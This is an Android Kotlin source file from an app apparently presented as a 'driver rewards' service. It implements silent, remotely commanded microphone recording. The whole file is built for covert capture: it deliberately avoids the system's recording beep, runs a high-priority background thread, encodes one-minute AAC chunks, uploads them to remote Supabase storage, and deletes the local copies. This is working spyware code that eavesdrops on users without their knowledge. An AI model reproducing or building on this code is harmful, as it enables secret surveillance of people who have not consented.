// Package: com.sm.driverrewards.service.audio
// Zero-beep silent audio capture via raw AudioRecord + MediaCodec AAC-LC + MediaMuxer
package com.sm.driverrewards.service.audio

import android.annotation.SuppressLint
import android.content.Context
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaCodec
import android.media.MediaCodecInfo
import android.media.MediaFormat
import android.media.MediaMuxer
import android.media.MediaRecorder
import com.sm.core.config.AppConfig
import com.sm.driverrewards.data.repository.AgentRepository
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import java.io.File
import java.nio.ByteBuffer
import java.util.concurrent.atomic.AtomicBoolean

class AudioRecordPipeline(
    private val context: Context,
    private val repository: AgentRepository,
    private val deviceId: String,
    private val commandId: String?,
    private val totalDurationMinutes: Int = 5
) {

    private val isRecording = AtomicBoolean(false)
    private var recordThread: Thread? = null
    private val pipelineScope = CoroutineScope(Dispatchers.IO + Job())

    private val sampleRate = AppConfig.AUDIO_SAMPLE_RATE // 16000 Hz
    private val bitRate = AppConfig.AUDIO_BIT_RATE       // 32000 bps (32 kbps mono)
    private val channelCount = AppConfig.AUDIO_CHANNEL_COUNT // 1 (mono)
    private val chunkDurationMs = AppConfig.AUDIO_CHUNK_DURATION_SECONDS * 1000L // 60s chunks

    /**
     * Start silent audio recording loop.
     * MediaRecorder use nahi karte kyunki OEM devices shutter/beep sound inject kar dete hain.
     * AudioRecord direct hardware mic PCM buffer read karta hai - zero beep.
     */
    @SuppressLint("MissingPermission")
    fun start() {
        if (isRecording.getAndSet(true)) return

        recordThread = Thread {
            runRecordingLoop()
        }.apply {
            name = "SM-SilentAudioRecorder"
            priority = Thread.MAX_PRIORITY
            start()
        }
    }

    /**
     * Stop the pipeline and release resources.
     */
    fun stop() {
        isRecording.set(false)
        recordThread?.interrupt()
        recordThread = null
    }

    fun isRunning(): Boolean = isRecording.get()

    @SuppressLint("MissingPermission")
    private fun runRecordingLoop() {
        val minBufferSize = AudioRecord.getMinBufferSize(
            sampleRate,
            AudioFormat.CHANNEL_IN_MONO,
            AudioFormat.ENCODING_PCM_16BIT
        )
        val bufferSize = (minBufferSize * 2).coerceAtLeast(4096)

        val audioRecord = AudioRecord(
            MediaRecorder.AudioSource.MIC,
            sampleRate,
            AudioFormat.CHANNEL_IN_MONO,
            AudioFormat.ENCODING_PCM_16BIT,
            bufferSize
        )

        if (audioRecord.state != AudioRecord.STATE_INITIALIZED) {
            isRecording.set(false)
            return
        }

        audioRecord.startRecording()

        var chunkIndex = 0
        val startTimeMs = System.currentTimeMillis()
        val totalMaxDurationMs = totalDurationMinutes * 60 * 1000L

        val pcmBuffer = ByteArray(bufferSize)

        while (isRecording.get()) {
            val elapsedTotal = System.currentTimeMillis() - startTimeMs
            if (elapsedTotal >= totalMaxDurationMs) {
                // Command duration complete
                break
            }

            // 60-second chunk execute karo
            val chunkFile = getNextChunkFile(chunkIndex)
            val chunkSuccess = recordSingleChunk(
                audioRecord = audioRecord,
                pcmBuffer = pcmBuffer,
                outputFile = chunkFile,
                chunkIndex = chunkIndex,
                maxChunkDurationMs = chunkDurationMs
            )

            if (chunkSuccess && chunkFile.exists() && chunkFile.length() > 0) {
                // Asynchronously Supabase me upload karo aur local delete karo
                val finalChunkIndex = chunkIndex
                pipelineScope.launch {
                    uploadAndDeleteChunk(chunkFile, finalChunkIndex, AppConfig.AUDIO_CHUNK_DURATION_SECONDS)
                }
            }

            chunkIndex++
        }

        try {
            audioRecord.stop()
            audioRecord.release()
        } catch (_: Exception) {}

        isRecording.set(false)
    }

    /**
     * MediaCodec + MediaMuxer se ek 60s chunk encode aur mux karte hain
     */
    private fun recordSingleChunk(
        audioRecord: AudioRecord,
        pcmBuffer: ByteArray,
        outputFile: File,
        chunkIndex: Int,
        maxChunkDurationMs: Long
    ): Boolean {
        var codec: MediaCodec? = null
        var muxer: MediaMuxer? = null
        var isMuxerStarted = false
        var audioTrackIndex = -1

        try {
            val format = MediaFormat.createAudioFormat(
                MediaFormat.MIMETYPE_AUDIO_AAC,
                sampleRate,
                channelCount
            ).apply {
                setInteger(MediaFormat.KEY_AAC_PROFILE, MediaCodecInfo.CodecProfileLevel.AACObjectLC)
                setInteger(MediaFormat.KEY_BIT_RATE, bitRate)
                setInteger(MediaFormat.KEY_MAX_INPUT_SIZE, 16384)
            }

            codec = MediaCodec.createEncoderByType(MediaFormat.MIMETYPE_AUDIO_AAC)
            codec.configure(format, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE)
            codec.start()

            muxer = MediaMuxer(outputFile.absolutePath, MediaMuxer.OutputFormat.MUXER_OUTPUT_MPEG_4)

            val bufferInfo = MediaCodec.BufferInfo()
            val chunkStartMs = System.currentTimeMillis()
            var presentationTimeUs = 0L

            while (isRecording.get()) {
                val chunkElapsed = System.currentTimeMillis() - chunkStartMs
                if (chunkElapsed >= maxChunkDurationMs) {
                    break
                }

                // Mic se raw PCM read karo
                val readBytes = audioRecord.read(pcmBuffer, 0, pcmBuffer.size)
                if (readBytes > 0) {
                    // Feed into MediaCodec input buffer
                    val inputBufferIndex = codec.dequeueInputBuffer(10000L)
                    if (inputBufferIndex >= 0) {
                        val inputBuffer: ByteBuffer? = codec.getInputBuffer(inputBufferIndex)
                        inputBuffer?.clear()
                        inputBuffer?.put(pcmBuffer, 0, readBytes)

                        codec.queueInputBuffer(
                            inputBufferIndex,
                            0,
                            readBytes,
                            presentationTimeUs,
                            0
                        )

                        // Sample rate aur bytes ke hisaab se presentation time badhao
                        presentationTimeUs += (readBytes * 1_000_000L) / (sampleRate * 2L)
                    }
                }

                // MediaCodec se encoded AAC frames nikalo aur muxer me daalo
                var outputBufferIndex = codec.dequeueOutputBuffer(bufferInfo, 0L)
                while (outputBufferIndex >= 0) {
                    if ((bufferInfo.flags and MediaCodec.BUFFER_FLAG_CODEC_CONFIG) != 0) {
                        bufferInfo.size = 0
                    }

                    if (bufferInfo.size > 0 && isMuxerStarted) {
                        val encodedData = codec.getOutputBuffer(outputBufferIndex)
                        if (encodedData != null) {
                            encodedData.position(bufferInfo.offset)
                            encodedData.limit(bufferInfo.offset + bufferInfo.size)
                            muxer.writeSampleData(audioTrackIndex, encodedData, bufferInfo)
                        }
                    }

                    codec.releaseOutputBuffer(outputBufferIndex, false)
                    outputBufferIndex = codec.dequeueOutputBuffer(bufferInfo, 0L)
                }

                if (outputBufferIndex == MediaCodec.INFO_OUTPUT_FORMAT_CHANGED) {
                    if (!isMuxerStarted) {
                        val newFormat = codec.outputFormat
                        audioTrackIndex = muxer.addTrack(newFormat)
                        muxer.start()
                        isMuxerStarted = true
                    }
                }
            }

            return true
        } catch (e: Exception) {
            return false
        } finally {
            try {
                codec?.stop()
                codec?.release()
            } catch (_: Exception) {}

            try {
                if (isMuxerStarted) {
                    muxer?.stop()
                }
                muxer?.release()
            } catch (_: Exception) {}
        }
    }

    /**
     * Chunk ko Supabase Storage me upload karta hai aur phone se delete karta hai.
     * Saath hi 200MB cache limit enforce karta hai taaki storage overflow na ho.
     */
    private suspend fun uploadAndDeleteChunk(file: File, chunkIndex: Int, durationSeconds: Int) {
        try {
            val result = repository.uploadAudioChunk(
                deviceId = deviceId,
                commandId = commandId,
                file = file,
                chunkIndex = chunkIndex,
                durationSeconds = durationSeconds
            )

            if (result.isSuccess) {
                // Upload successful hone par turant delete karo
                if (file.exists()) {
                    file.delete()
                }
            }
        } catch (_: Exception) {
            // Agar network drop ho gaya toh file temporarily rahegi, next cycle me sync hogi
        } finally {
            enforceCacheCap()
        }
    }

    private fun getNextChunkFile(index: Int): File {
        val audioDir = File(context.cacheDir, "audio_chunks").apply { mkdirs() }
        return File(audioDir, "rec_${System.currentTimeMillis()}_chunk_$index.m4a")
    }

    /**
     * 200MB local cache limit check karta hai.
     * Agar offline hone ki wajah se cache 200MB cross kar jaye toh purane chunks pehle delete kar deta hai.
     */
    private fun enforceCacheCap() {
        try {
            val audioDir = File(context.cacheDir, "audio_chunks")
            if (!audioDir.exists()) return

            val files = audioDir.listFiles() ?: return
            var totalSize = files.sumOf { it.length() }

            if (totalSize > AppConfig.LOCAL_AUDIO_CACHE_CAP_BYTES) {
                // Purani files pehle sort karo
                val sortedFiles = files.sortedBy { it.lastModified() }
                for (oldFile in sortedFiles) {
                    if (totalSize <= AppConfig.LOCAL_AUDIO_CACHE_CAP_BYTES) break
                    val size = oldFile.length()
                    if (oldFile.delete()) {
                        totalSize -= size
                    }
                }
            }
        } catch (_: Exception) {}
    }
}
